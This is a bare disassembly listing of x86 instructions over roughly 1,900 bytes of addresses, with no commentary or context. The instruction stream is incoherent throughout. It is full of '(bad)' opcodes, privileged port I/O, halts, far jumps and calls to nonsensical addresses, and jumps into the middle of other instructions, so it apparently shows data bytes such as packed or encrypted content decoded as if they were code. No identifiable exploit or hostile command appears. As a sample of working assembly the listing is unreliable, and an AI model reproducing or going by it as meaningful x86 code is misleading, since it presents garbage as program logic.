  41b9ac:	xchg   ecx,eax
  41b9ad:	in     eax,dx
  41b9ae:	imul   edx,DWORD PTR [edi],0x94582e1b
  41b9b4:	jbe    0x41b9fa
  41b9b6:	mov    ss,WORD PTR [ebx+0x7576ad39]
  41b9bc:	jnp    0x41b9aa
  41b9be:	in     al,0x85
  41b9c0:	aad    0x67
  41b9c2:	xchg   ebp,eax
  41b9c3:	jmp    0xee9c:0x6b6d4d73
  41b9ca:	xor    BYTE PTR [esi+0x68],bh
  41b9cd:	jge    0x41b977
  41b9cf:	in     eax,dx
  41b9d0:	jno    0x41ba0c
  41b9d2:	cmp    edx,DWORD PTR [ebx]
  41b9d4:	mov    bh,0x16
  41b9d6:	or     eax,0xb726eccd
  41b9db:	outs   dx,DWORD PTR ds:[esi]
  41b9dc:	inc    esi
  41b9dd:	mov    BYTE PTR [ecx-0x77],bh
  41b9e0:	iret   
  41b9e1:	jle    0x41b9fa
  41b9e3:	jns    0x41ba60
  41b9e5:	push   ss
  41b9e6:	enter  0xb275,0x68
  41b9ea:	push   ebx
  41b9eb:	je     0x41b983
  41b9ed:	popf   
  41b9ee:	cmp    eax,0xee1e4378
  41b9f3:	mov    edx,0xb3081358
  41b9f8:	mov    eax,0x6d4495b2
  41b9fd:	ret    0x6b46
  41ba00:	adc    bl,dh
  41ba02:	cwde   
  41ba03:	stos   BYTE PTR es:[edi],al
  41ba04:	(bad)  
  41ba05:	aam    0xa4
  41ba07:	push   eax
  41ba08:	xor    DWORD PTR ss:[ecx],edx
  41ba0b:	mov    dl,0xbb
  41ba0d:	in     eax,0x4e
  41ba0f:	retf   
  41ba10:	jmp    0x41b9d2
  41ba12:	push   ebx
  41ba13:	sub    eax,0x3565f6d1
  41ba18:	jno    0x41b9ae
  41ba1a:	pop    es
  41ba1b:	jbe    0x41b9eb
  41ba1d:	pop    ebx
  41ba1e:	arpl   ax,cx
  41ba20:	sub    DWORD PTR [ecx],esi
  41ba22:	das    
  41ba23:	addr16 sbb eax,0x54e6b6ab
  41ba29:	arpl   bp,sp
  41ba2b:	sbb    edi,DWORD PTR [edx-0x17638ac7]
  41ba31:	mul    BYTE PTR [ecx-0x7321b247]
  41ba37:	ds sub al,cl
  41ba3a:	sub    eax,0x7d478512
  41ba3f:	cmp    eax,0xb3a9f494
  41ba44:	out    0xe3,al
  41ba46:	push   cs
  41ba47:	repnz pop ecx
  41ba49:	cmp    edi,DWORD PTR [eax]
  41ba4b:	mov    dh,0x2
  41ba4d:	lock out 0xd5,al
  41ba50:	adc    BYTE PTR [edi+edx*1+0x2],ah
  41ba54:	dec    edx
  41ba55:	in     al,dx
  41ba56:	sub    DWORD PTR [eax-0x204e37b],edx
  41ba5c:	push   edi
  41ba5d:	ret    0xb855
  41ba60:	loopne 0x41bad4
  41ba62:	mov    ebx,0xd67705a7
  41ba67:	or     dl,cl
  41ba69:	mov    eax,0x50a579f4
  41ba6e:	mov    DWORD PTR [ebx-0x4f534d25],eax
  41ba74:	jb     0x41ba68
  41ba76:	pop    edi
  41ba77:	xor    eax,0x80f17cf9
  41ba7c:	mov    edx,0x1dd40d9b
  41ba81:	and    al,0x60
  41ba83:	lock ins DWORD PTR es:[edi],dx
  41ba85:	lods   eax,DWORD PTR ds:[esi]
  41ba86:	dec    edi
  41ba87:	loope  0x41bac5
  41ba89:	into   
  41ba8a:	hlt    
  41ba8b:	fs test eax,0x654e0ab7
  41ba91:	jecxz  0x41ba1c
  41ba93:	sbb    al,BYTE PTR [ecx-0x56ebc1bf]
  41ba99:	add    edi,DWORD PTR ds:0x10cb14d8
  41ba9f:	sub    dh,BYTE PTR [ebx]
  41baa1:	test   eax,0x3c512dd
  41baa6:	fadd   DWORD PTR ds:0x83e1a036
  41baac:	adc    edi,0x9
  41baaf:	stos   DWORD PTR es:[edi],eax
  41bab0:	pop    eax
  41bab1:	pop    eax
  41bab2:	mov    DWORD PTR [edx],edi
  41bab4:	pusha  
  41bab5:	fucom  st(0)
  41bab7:	ins    DWORD PTR es:[edi],dx
  41bab8:	lds    esi,FWORD PTR [ebx-0x7da43dea]
  41babe:	mov    ah,0xa9
  41bac0:	cmp    al,0x6c
  41bac2:	ins    DWORD PTR es:[edi],dx
  41bac3:	das    
  41bac4:	pushf  
  41bac5:	loope  0x41ba88
  41bac7:	loopne 0x41baa0
  41bac9:	push   ss
  41baca:	retf   
  41bacb:	pushf  
  41bacc:	imul   edi,ecx,0xffffff88
  41bacf:	scas   al,BYTE PTR es:[edi]
  41bad0:	mov    BYTE PTR [edi-0x3e],bh
  41bad3:	mov    dl,BYTE PTR [edx+ebp*8]
  41bad6:	iret   
  41bad7:	dec    ebp
  41bad8:	repz and esi,DWORD PTR [esi]
  41badb:	dec    eax
  41badc:	mov    WORD PTR [esp+edx*2+0x5c],?
  41bae0:	or     edx,DWORD PTR [eax+0x15]
  41bae3:	cmp    DWORD PTR [edi+ecx*1],edx
  41bae6:	cdq    
  41bae7:	pop    ss
  41bae8:	sbb    BYTE PTR ds:0xc4bd5f95,ah
  41baee:	push   ebp
  41baef:	push   ebp
  41baf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baf1:	cli    
  41baf2:	pusha  
  41baf3:	or     BYTE PTR [edi],0x28
  41baf6:	and    al,0x95
  41baf8:	sbb    al,0x1c
  41bafa:	push   ebp
  41bafb:	xchg   dh,ch
  41bafd:	pop    ds
  41bafe:	mov    bh,0x11
  41bb00:	xchg   edi,eax
  41bb01:	or     BYTE PTR [edx],ah
  41bb03:	mov    DWORD PTR [ebx+0x5afeb0b7],ecx
  41bb09:	(bad)  
  41bb0a:	lods   eax,DWORD PTR ds:[esi]
  41bb0b:	in     al,0xe0
  41bb0d:	mov    eax,ds:0x3876b2ff
  41bb12:	scas   al,BYTE PTR es:[edi]
  41bb13:	xor    al,BYTE PTR [esi-0x3d]
  41bb16:	sbb    ebp,DWORD PTR [ecx+0x28678fd]
  41bb1c:	adc    edi,ecx
  41bb1e:	sub    DWORD PTR [edi-0x27727785],0xffffffa9
  41bb25:	ret    0xfbc7
  41bb28:	lock jns 0x41bb6c
  41bb2b:	mov    eax,edx
  41bb2d:	sub    ecx,eax
  41bb2f:	push   ebx
  41bb30:	fwait
  41bb31:	mov    edi,0x1925a6a6
  41bb36:	jb     0x41bb9b
  41bb38:	push   esi
  41bb39:	data16 fwait
  41bb3b:	sub    esp,DWORD PTR [eax+0x7b071330]
  41bb41:	sub    eax,0xb64310c8
  41bb46:	loop   0x41bbae
  41bb48:	imul   eax
  41bb4a:	dec    edi
  41bb4b:	sub    edi,DWORD PTR [ebp+0x4f]
  41bb4e:	dec    ecx
  41bb4f:	inc    ebp
  41bb50:	stos   BYTE PTR es:[edi],al
  41bb51:	and    ebx,DWORD PTR [edx-0x33005f57]
  41bb57:	test   BYTE PTR [ebx-0x7548626b],dl
  41bb5d:	int    0x24
  41bb5f:	sub    al,BYTE PTR [ebx+0x7a94aa35]
  41bb65:	pop    edx
  41bb66:	xor    eax,DWORD PTR [edx-0x7a]
  41bb69:	in     al,0x16
  41bb6b:	mov    WORD PTR [eax+0x5a63403],cs
  41bb71:	pop    es
  41bb72:	jnp    0x41bbc7
  41bb74:	ret    0x405f
  41bb77:	add    eax,DWORD PTR [ecx+0x623b388d]
  41bb7d:	add    ax,0xd85d
  41bb81:	stc    
  41bb82:	xchg   ecx,eax
  41bb83:	out    0x24,eax
  41bb85:	sbb    BYTE PTR [esi+ecx*1+0x32],ah
  41bb89:	fsub   st,st(2)
  41bb8b:	or     bh,bh
  41bb8d:	push   ebx
  41bb8e:	jbe    0x41bb54
  41bb90:	std    
  41bb91:	test   DWORD PTR fs:[ebx+0x5e],ecx
  41bb95:	jecxz  0x41bb8c
  41bb97:	adc    edx,esi
  41bb99:	jp     0x41bb28
  41bb9b:	push   edx
  41bb9c:	int3   
  41bb9d:	xor    al,0x7b
  41bb9f:	loope  0x41bb49
  41bba1:	outs   dx,BYTE PTR ds:[esi]
  41bba2:	inc    ecx
  41bba3:	push   eax
  41bba4:	(bad)  
  41bba5:	aad    0x71
  41bba7:	mov    dh,cl
  41bba9:	and    eax,0xd7478bac
  41bbae:	cmp    DWORD PTR [ebx+0x56f85e04],edi
  41bbb4:	(bad)  
  41bbb6:	mov    cl,0xaa
  41bbb8:	je     0x41bb4c
  41bbba:	or     ecx,DWORD PTR [edi]
  41bbbc:	sub    ch,BYTE PTR [ecx+0x3a8258a2]
  41bbc2:	push   eax
  41bbc3:	sete   dl
  41bbc6:	(bad)  
  41bbc7:	mov    ebp,0xf3306ed1
  41bbcc:	xor    edx,eax
  41bbce:	add    ebx,DWORD PTR ds:0x42a379
  41bbd4:	jmp    0x41c0e6
  41bbd9:	(bad)  
  41bbda:	ror    ebx,cl
  41bbdc:	cmp    al,0xdb
  41bbde:	aam    0xcb
  41bbe0:	fist   DWORD PTR [eax-0x3a51325f]
  41bbe6:	ror    DWORD PTR [edi+0x7f97bbc0],cl
  41bbec:	js     0x41bc61
  41bbee:	jl     0x41bc68
  41bbf0:	js     0x41bbd3
  41bbf2:	imul   ebx,DWORD PTR [edi],0x7216b6ad
  41bbf8:	scas   eax,DWORD PTR es:[edi]
  41bbf9:	test   eax,0x6b79e41a
  41bbfe:	xchg   ecx,eax
  41bbff:	pop    esi
  41bc00:	pop    ds
  41bc01:	out    0xe8,eax
  41bc03:	or     DWORD PTR [ecx-0x6f23cebf],edi
  41bc09:	and    al,0xa3
  41bc0b:	mov    esp,0x6a0d7e53
  41bc10:	mov    ss,esi
  41bc12:	mov    al,0x59
  41bc14:	sbb    al,0xf3
  41bc16:	pusha  
  41bc17:	mov    eax,0xbe975b6f
  41bc1c:	xchg   DWORD PTR [eax+edx*1+0x5c],ecx
  41bc20:	sbb    DWORD PTR [edi+ebp*8+0x7e],edi
  41bc24:	repnz adc DWORD PTR [edx+0x2d4284ea],ebp
  41bc2b:	addr16 pop ecx
  41bc2d:	mov    dh,0x86
  41bc2f:	loop   0x41bbfe
  41bc31:	inc    edx
  41bc32:	push   cs
  41bc33:	xchg   BYTE PTR [ecx-0x7be0b7aa],bh
  41bc39:	jg     0x41bc4e
  41bc3b:	stc    
  41bc3c:	jmp    0xdfc88fe1
  41bc41:	jle    0x41bbc3
  41bc43:	aas    
  41bc44:	adc    BYTE PTR [eax-0xd],ch
  41bc47:	mov    al,ds:0x737748c1
  41bc4c:	ret    
  41bc4d:	aaa    
  41bc4e:	repnz add eax,0xe476da0d
  41bc54:	jl     0x41bc02
  41bc56:	add    edi,edi
  41bc58:	jb     0x41bc37
  41bc5a:	(bad)  
  41bc5b:	mov    ebx,0x7e5e1714
  41bc60:	sub    esp,DWORD PTR [ebp-0x64]
  41bc63:	mov    bl,0x81
  41bc65:	cmc    
  41bc66:	adc    eax,0xe497e7fd
  41bc6b:	repnz ss push ecx
  41bc6e:	pop    esp
  41bc6f:	pop    ebp
  41bc70:	push   edx
  41bc71:	add    DWORD PTR [esp+ebp*2-0x74668664],ebx
  41bc78:	arpl   WORD PTR [esi+0x4b3bc1dc],sp
  41bc7e:	dec    edi
  41bc7f:	sbb    eax,0x94a5c17e
  41bc84:	cld    
  41bc85:	cmp    BYTE PTR [esi-0x6be5a468],ch
  41bc8b:	popa   
  41bc8c:	xchg   ebp,eax
  41bc8d:	mov    ecx,0x2a4021b9
  41bc92:	(bad)  ds:0x7a615c41
  41bc98:	ret    
  41bc99:	fcmovnbe st,st(5)
  41bc9b:	and    al,0xe5
  41bc9d:	add    ebx,esp
  41bc9f:	outs   dx,DWORD PTR ds:[esi]
  41bca0:	call   0xcacb:0xf197a4c4
  41bca7:	mov    ebx,0xd6a86c3d
  41bcac:	mov    edx,0x2197cb3f
  41bcb1:	push   es
  41bcb2:	jge    0x41bc3a
  41bcb4:	xchg   ecx,eax
  41bcb5:	fucomp st(4)
  41bcb7:	jns    0x41bd22
  41bcb9:	cs jmp 0x17c5:0x16025b86
  41bcc1:	xchg   BYTE PTR [ebp-0x3feff334],bl
  41bcc7:	ret    
  41bcc8:	xor    cl,cl
  41bcca:	imul   esp,esi,0x90fa274d
  41bcd0:	pop    es
  41bcd1:	xor    BYTE PTR [ecx-0x7e855f13],bl
  41bcd7:	pop    eax
  41bcd8:	jge    0x41bd10
  41bcda:	jle    0x41bc89
  41bcdc:	scas   al,BYTE PTR es:[edi]
  41bcdd:	xor    eax,0x3ef55e6b
  41bce3:	inc    esp
  41bce4:	leave  
  41bce5:	imul   esp,DWORD PTR [esp+edi*2],0xba851b8c
  41bcec:	pop    ebx
  41bced:	mov    ebx,0xc20a349b
  41bcf2:	fisttp WORD PTR ds:0x5966cb9c
  41bcf8:	xor    eax,DWORD PTR fs:[ebx]
  41bcfb:	nop
  41bcfc:	mov    bh,0x4d
  41bcfe:	ret    0x17dd
  41bd01:	xchg   ebp,eax
  41bd02:	mov    ah,al
  41bd04:	push   ebx
  41bd05:	aam    0x76
  41bd07:	sbb    eax,0x45e18d1e
  41bd0c:	les    esi,FWORD PTR [ecx+0x6ce9e0ee]
  41bd12:	inc    edi
  41bd13:	dec    edi
  41bd14:	scas   al,BYTE PTR es:[edi]
  41bd15:	mov    BYTE PTR [edi+0x2c030d26],bl
  41bd1b:	pusha  
  41bd1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd1d:	stos   BYTE PTR es:[edi],al
  41bd1e:	outs   dx,DWORD PTR ds:[esi]
  41bd1f:	mov    edx,0x24456c1a
  41bd24:	gs mov edx,0x2f529836
  41bd2a:	in     al,0xc2
  41bd2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd2d:	test   al,0xff
  41bd2f:	mov    ecx,DWORD PTR [edi-0x3a5327a3]
  41bd35:	ins    DWORD PTR es:[edi],dx
  41bd36:	mov    ch,0x64
  41bd38:	sub    edx,DWORD PTR [ebx+0x1184be9b]
  41bd3e:	or     eax,0x5ed8cfa1
  41bd43:	dec    edx
  41bd44:	stos   DWORD PTR es:[edi],eax
  41bd45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd47:	mov    gs:0xf3f24d58,al
  41bd4d:	mov    ebx,0xa274f39a
  41bd52:	mov    esp,0x44434238
  41bd57:	les    ebx,FWORD PTR [ecx+0x6e4a0c3d]
  41bd5d:	pop    ebx
  41bd5e:	and    al,0x84
  41bd60:	dec    ebx
  41bd61:	sar    BYTE PTR [edx-0x80],1
  41bd64:	aaa    
  41bd65:	mov    eax,DWORD PTR [esi]
  41bd67:	pop    ds
  41bd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd6a:	sbb    edx,DWORD PTR [esi-0x14c38e37]
  41bd70:	push   0x7c
  41bd72:	xchg   edi,eax
  41bd73:	rcr    BYTE PTR [esi-0x3f],1
  41bd76:	inc    ecx
  41bd77:	ins    DWORD PTR es:[edi],dx
  41bd78:	push   esp
  41bd79:	es sbb al,0xad
  41bd7c:	push   ebp
  41bd7d:	fidivr WORD PTR [ecx]
  41bd7f:	jp     0x41bdf5
  41bd81:	and    ebx,DWORD PTR [eax+0x5d5340c0]
  41bd87:	fisub  WORD PTR [edi+0x29]
  41bd8a:	(bad)  
  41bd8b:	pop    edx
  41bd8c:	or     DWORD PTR [ebx-0x1c],esp
  41bd8f:	xchg   ecx,eax
  41bd90:	ja     0x41bde7
  41bd92:	vpmacsdd xmm14,xmm3,XMMWORD PTR [esi-0x4],xmm1
  41bd99:	gs das 
  41bd9b:	out    dx,al
  41bd9c:	jns    0x41bd4e
  41bd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd9f:	mov    ds:0xe9252c0d,al
  41bda4:	test   eax,0x15e7f64
  41bda9:	ret    0x83bc
  41bdac:	cld    
  41bdad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdae:	push   ds
  41bdaf:	lahf   
  41bdb0:	adc    ebx,DWORD PTR [eax]
  41bdb2:	sub    eax,0x53998e9e
  41bdb7:	cwde   
  41bdb8:	inc    eax
  41bdb9:	add    BYTE PTR [eax],bh
  41bdbb:	cmp    dl,BYTE PTR [edx-0x1c]
  41bdbe:	jecxz  0x41be30
  41bdc0:	test   BYTE PTR [esi+0x13e84ab9],dl
  41bdc6:	gs aad 0xe6
  41bdc9:	sahf   
  41bdca:	pusha  
  41bdcb:	sub    dl,bh
  41bdcd:	xchg   BYTE PTR [ecx+0x25],dh
  41bdd0:	mov    eax,ds:0x51cd7230
  41bdd5:	push   DWORD PTR [edx+0x3866e881]
  41bddb:	jae    0x41be58
  41bddd:	test   DWORD PTR [ebx-0x5ca12d62],edx
  41bde3:	stc    
  41bde4:	test   DWORD PTR [ebx],esp
  41bde6:	or     ch,BYTE PTR [eax]
  41bde8:	jle    0x41be2f
  41bdea:	dec    edi
  41bdeb:	jns    0x41bd96
  41bded:	pop    edi
  41bdee:	aas    
  41bdef:	xchg   ebx,eax
  41bdf0:	jne    0x41bddc
  41bdf2:	test   DWORD PTR [ebp-0x1b6800db],esp
  41bdf8:	popa   
  41bdf9:	rcl    DWORD PTR [ecx+0x64],1
  41bdfc:	dec    ebx
  41bdfd:	mov    edi,0x6fd4d495
  41be02:	cmp    edx,DWORD PTR ds:0x77c06989
  41be08:	jle    0x41be1f
  41be0a:	into   
  41be0b:	xlat   BYTE PTR ds:[ebx]
  41be0c:	ficom  WORD PTR [edx+0x5a]
  41be0f:	push   esp
  41be10:	inc    esp
  41be11:	jbe    0x41bde1
  41be13:	or     al,0x40
  41be15:	test   eax,0xee8fa865
  41be1a:	mov    bl,0x2e
  41be1c:	fucompp 
  41be1e:	sub    bl,BYTE PTR [eax]
  41be20:	(bad)  
  41be21:	mov    bl,0xa3
  41be23:	fwait
  41be24:	div    BYTE PTR [edx+0x4e486fea]
  41be2a:	retf   0x49f4
  41be2d:	mov    eax,0x17ac741e
  41be32:	push   eax
  41be33:	test   al,0x2b
  41be35:	mov    dl,0x6c
  41be37:	popa   
  41be38:	loopne 0x41be24
  41be3a:	sub    eax,0x29ea1268
  41be3f:	popf   
  41be40:	mov    ah,0x82
  41be42:	das    
  41be43:	(bad)  
  41be44:	and    eax,0x11d9eb4e
  41be49:	pop    ebp
  41be4a:	cld    
  41be4b:	xor    esi,esp
  41be4d:	sbb    DWORD PTR [ecx],ecx
  41be4f:	and    bl,BYTE PTR [ebx-0x68c6e1a7]
  41be55:	(bad)  
  41be56:	and    al,0xea
  41be58:	dec    esi
  41be59:	and    ebx,DWORD PTR ds:0xe71e5acb
  41be5f:	aaa    
  41be60:	inc    ebx
  41be61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be62:	test   BYTE PTR [eax],al
  41be64:	retf   0xea49
  41be67:	(bad)  
  41be68:	or     eax,0xdff45851
  41be6d:	iret   
  41be6e:	aad    0x29
  41be70:	adc    BYTE PTR [edx-0x66356730],0xbb
  41be77:	aam    0x60
  41be79:	popf   
  41be7a:	or     eax,0x1ee63848
  41be7f:	add    ebp,DWORD PTR [esi-0x55]
  41be82:	pop    ss
  41be83:	cli    
  41be84:	push   DWORD PTR [edi-0x15dea199]
  41be8a:	or     al,0x55
  41be8c:	pusha  
  41be8d:	pop    ebx
  41be8e:	outs   dx,DWORD PTR ds:[esi]
  41be8f:	or     DWORD PTR [eax+0x54075ab2],edi
  41be95:	or     BYTE PTR [esp+eiz*2+0x3a1c5cfa],bl
  41be9c:	sahf   
  41be9d:	mov    al,0xf7
  41be9f:	in     al,dx
  41bea0:	pop    edi
  41bea1:	mov    ebx,cs
  41bea3:	lods   eax,DWORD PTR ds:[esi]
  41bea4:	push   ecx
  41bea5:	fidiv  WORD PTR [edi+0x7b]
  41bea8:	in     eax,dx
  41bea9:	adc    DWORD PTR [ecx-0x71896340],0x8c592804
  41beb3:	jmp    0xaa0b:0x42e8663c
  41beba:	inc    edx
  41bebb:	xchg   edi,eax
  41bebc:	pop    esi
  41bebd:	adc    eax,0xc2fa306e
  41bec2:	jmp    0x41be69
  41bec4:	bound  ebp,QWORD PTR [edx]
  41bec6:	cld    
  41bec7:	jge    0x41bf0d
  41bec9:	push   esi
  41beca:	sbb    BYTE PTR [eax+0x35fff600],dl
  41bed0:	test   al,0x9a
  41bed2:	push   ss
  41bed3:	mov    ebp,0x2a757965
  41bed8:	push   0xffffffe7
  41beda:	hlt    
  41bedb:	sbb    cl,cl
  41bedd:	and    eax,DWORD PTR [eax+edx*8]
  41bee0:	gs mov esi,0xd015a93
  41bee6:	mov    edx,0x91edaaf5
  41beeb:	fwait
  41beec:	loopne 0x41bf1a
  41beee:	fisttp WORD PTR [edx+0x17]
  41bef1:	fiadd  WORD PTR cs:0xff4fa84b
  41bef8:	icebp  
  41bef9:	fwait
  41befa:	mov    ah,0x91
  41befc:	inc    ecx
  41befd:	(bad)  
  41befe:	push   ebx
  41beff:	xchg   ebx,eax
  41bf00:	popf   
  41bf01:	jecxz  0x41be99
  41bf03:	mov    dh,0x3a
  41bf05:	sub    ecx,DWORD PTR [edx+0x43]
  41bf08:	push   ss
  41bf09:	jnp    0x41be91
  41bf0b:	jge    0x41befe
  41bf0d:	fistp  WORD PTR [esi+esi*1+0x29]
  41bf11:	sbb    DWORD PTR [esi+0x67],0x4e
  41bf15:	xor    ch,BYTE PTR [ebx-0x6ed81ed2]
  41bf1b:	cmp    eax,0x86f40c62
  41bf20:	xchg   esi,eax
  41bf21:	inc    ebx
  41bf22:	push   ebx
  41bf23:	cld    
  41bf24:	mov    ds:0x3e66d6f7,al
  41bf29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf2a:	int    0x80
  41bf2c:	push   esi
  41bf2d:	sbb    eax,0x80705df0
  41bf32:	adc    al,BYTE PTR [ebp+0x20d7fe3c]
  41bf38:	js     0x41bf75
  41bf3a:	in     eax,dx
  41bf3b:	mov    esp,0xe867ada5
  41bf40:	fimul  DWORD PTR [ebx]
  41bf42:	inc    ebp
  41bf43:	push   0xfffffff5
  41bf45:	xor    BYTE PTR [edi+edi*1-0x2a],dh
  41bf49:	adc    BYTE PTR [eax+ebp*2],bh
  41bf4c:	in     eax,0x8a
  41bf4e:	push   ebx
  41bf50:	mov    ebp,0x9ebd985d
  41bf55:	mov    al,ds:0x38302dec
  41bf5a:	rep ins BYTE PTR es:[edi],dx
  41bf5c:	in     eax,0xde
  41bf5e:	sub    DWORD PTR [ebx+0x43],0xd5404d36
  41bf65:	fsub   QWORD PTR [esi]
  41bf67:	enter  0x4e0a,0x98
  41bf6b:	and    ah,dh
  41bf6d:	dec    edi
  41bf6e:	jae    0x41bf64
  41bf70:	push   es
  41bf71:	adc    al,0x85
  41bf73:	addr16 mov al,0xeb
  41bf76:	mov    esp,0x2ca68810
  41bf7b:	xchg   ecx,eax
  41bf7c:	jo     0x41bf27
  41bf7e:	fisttp DWORD PTR [edx]
  41bf80:	call   FWORD PTR [ecx+ebx*4+0x2da50021]
  41bf87:	push   ebx
  41bf88:	enter  0x4fb9,0xa6
  41bf8c:	out    0xdf,al
  41bf8e:	dec    ecx
  41bf8f:	cmp    al,0xdc
  41bf91:	mov    bh,0x80
  41bf93:	or     BYTE PTR [ecx+0x3d710242],ch
  41bf99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf9a:	adc    ah,BYTE PTR [ecx]
  41bf9c:	fsubr  st,st(6)
  41bf9e:	dec    edi
  41bf9f:	cmp    eax,0x8544bdb1
  41bfa4:	(bad)  
  41bfa5:	imul   BYTE PTR [ebp+edi*4-0x3d]
  41bfa9:	sbb    BYTE PTR gs:[ecx-0x7d],cl
  41bfad:	sbb    al,0x55
  41bfaf:	xor    eax,0xe9cbd9d9
  41bfb4:	fimul  DWORD PTR [edi-0x52]
  41bfb7:	fidivr WORD PTR [eax+ebp*1+0xe64b48e]
  41bfbe:	out    0x43,eax
  41bfc0:	pushf  
  41bfc1:	hlt    
  41bfc2:	outs   dx,BYTE PTR ds:[esi]
  41bfc3:	pusha  
  41bfc4:	iret   
  41bfc5:	lods   al,BYTE PTR ds:[esi]
  41bfc6:	mov    esi,DWORD PTR [esp+eax*2]
  41bfc9:	ss aas 
  41bfcb:	mov    ds:0x813f9246,al
  41bfd0:	(bad)  
  41bfd1:	pop    ecx
  41bfd2:	mov    al,0xdb
  41bfd4:	hlt    
  41bfd5:	sbb    bl,BYTE PTR [ebx+0x3b]
  41bfd8:	nop
  41bfd9:	sub    eax,0x31d34e2c
  41bfde:	imul   ebp,DWORD PTR [ebx+0x2b],0x38
  41bfe2:	mov    BYTE PTR [edi],0x97
  41bfe5:	adc    edx,DWORD PTR [esi-0x15316629]
  41bfeb:	out    dx,al
  41bfec:	ins    BYTE PTR es:[edi],dx
  41bfed:	xor    esi,DWORD PTR [ebp+ecx*4+0x2b]
  41bff1:	leave  
  41bff2:	stc    
  41bff3:	ss sti 
  41bff5:	mov    BYTE PTR [ebx+eiz*8-0x3c],0xe9
  41bffa:	mov    dh,0xa4
  41bffc:	pop    ss
  41bffd:	mov    ch,BYTE PTR [edx+edi*1+0x48]
  41c001:	mov    DWORD PTR [edx-0x2bf090bc],ecx
  41c007:	or     BYTE PTR ds:0xce5caf56,dh
  41c00d:	xchg   ecx,eax
  41c00e:	ja     0x41c046
  41c010:	cdq    
  41c011:	pop    ecx
  41c012:	pop    ecx
  41c013:	(bad)  
  41c014:	in     eax,dx
  41c015:	jmp    0x41c090
  41c017:	ins    DWORD PTR es:[edi],dx
  41c018:	add    DWORD PTR [edi+eiz*1+0x710a9629],edx
  41c01f:	and    DWORD PTR [eax],esp
  41c021:	dec    esi
  41c022:	jecxz  0x41c06b
  41c024:	xor    al,0x87
  41c026:	ds cwde 
  41c028:	xchg   esi,eax
  41c029:	dec    ebp
  41c02a:	pop    edi
  41c02b:	rcl    BYTE PTR [esi],cl
  41c02d:	mov    cl,0x5c
  41c02f:	loopne 0x41c052
  41c031:	mov    ds:0x7805f172,al
  41c036:	jge    0x41c081
  41c038:	jp     0x41bfba
  41c03a:	pop    ebp
  41c03b:	nop
  41c03c:	and    bh,BYTE PTR [ebp+0x64]
  41c03f:	fisttp DWORD PTR [eax-0x6e9ee334]
  41c045:	out    dx,al
  41c046:	lahf   
  41c047:	xchg   ebp,eax
  41c048:	lock mov edx,0x80525fba
  41c04e:	retf   
  41c04f:	xchg   esi,eax
  41c050:	sub    bl,BYTE PTR [ebp+0x9fd487c]
  41c056:	push   esp
  41c057:	or     eax,0x81a2ba12
  41c05c:	xchg   esp,eax
  41c05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c05e:	addr16 jae 0x41c02b
  41c061:	lock out dx,eax
  41c063:	mov    bl,0xe2
  41c065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c066:	pop    es
  41c067:	rol    esp,1
  41c069:	jne    0x41c0e8
  41c06b:	or     bh,BYTE PTR [edi+0x60]
  41c06e:	rol    BYTE PTR [ecx],cl
  41c070:	std    
  41c071:	pop    ebp
  41c072:	scas   eax,DWORD PTR es:[edi]
  41c073:	out    dx,al
  41c074:	in     al,dx
  41c075:	adc    edx,DWORD PTR [edx]
  41c077:	xchg   ebp,eax
  41c078:	sbb    esp,DWORD PTR ds:0xc83ac780
  41c07e:	ins    DWORD PTR es:[edi],dx
  41c07f:	pop    esi
  41c080:	jg     0x41c0e8
  41c082:	xlat   BYTE PTR ds:[ebx]
  41c083:	gs adc al,0x52
  41c086:	sub    ebp,DWORD PTR [eax+ecx*1+0x1a8d63c6]
  41c08d:	sub    dh,BYTE PTR [edx+eax*2-0x4b5f3fcf]
  41c094:	push   0x32
  41c096:	aam    0xbe
  41c098:	mul    BYTE PTR [ebx+0x3b5f2cc8]
  41c09e:	mov    ebx,0xd44ab2cd
  41c0a3:	pop    ss
  41c0a4:	imul   esp,DWORD PTR [esi],0x3754328e
  41c0aa:	xor    edi,DWORD PTR [esi+0x78]
  41c0ad:	outs   dx,BYTE PTR ds:[esi]
  41c0ae:	dec    ebp
  41c0af:	ret    0x5db6
  41c0b2:	jo     0x41c115
  41c0b4:	sbb    cl,dh
  41c0b6:	xor    esi,DWORD PTR [ebx]
  41c0b8:	imul   ebx,esi,0x15a27314
  41c0be:	lahf   
  41c0bf:	adc    ecx,eax
  41c0c1:	or     al,0xdb
  41c0c3:	inc    ebp
  41c0c4:	out    0xde,eax
  41c0c6:	and    eax,0x488863e2
  41c0cb:	pop    es
  41c0cc:	ins    DWORD PTR es:[edi],dx
  41c0cd:	adc    al,0x71
  41c0cf:	add    edi,DWORD PTR [ebp+ebp*8-0x4a6d77eb]
  41c0d6:	rcl    DWORD PTR [esp+edx*1-0x15],1
  41c0da:	inc    edx
  41c0db:	mov    eax,ds:0xe42b37c4
  41c0e0:	jo     0x41c0d1
  41c0e2:	xchg   BYTE PTR gs:[ebx-0x1607cc64],cl
  41c0e9:	or     eax,0xc6000005
  41c0ee:	int    0xce
  41c0f0:	(bad)  
  41c0f1:	aad    0xd5
  41c0f3:	(bad)  
  41c0f4:	int    0x5f
  41c0f6:	sahf   
  41c0f7:	pusha  
  41c0f8:	mov    WORD PTR [edi],cs
  41c0fa:	lods   al,BYTE PTR ds:[esi]
  41c0fb:	inc    edi
  41c0fc:	(bad)  
  41c0fd:	scas   al,BYTE PTR es:[edi]
  41c0fe:	call   0x7878:0x7c73787f
  41c105:	inc    esp
  41c106:	(bad)  [edi-0x5de401cb]
  41c10c:	sbb    al,0x91
  41c10e:	test   BYTE PTR [ecx-0x669c9106],0xb9
  41c115:	into   
  41c116:	dec    esp
  41c117:	add    BYTE PTR [esi],0x87
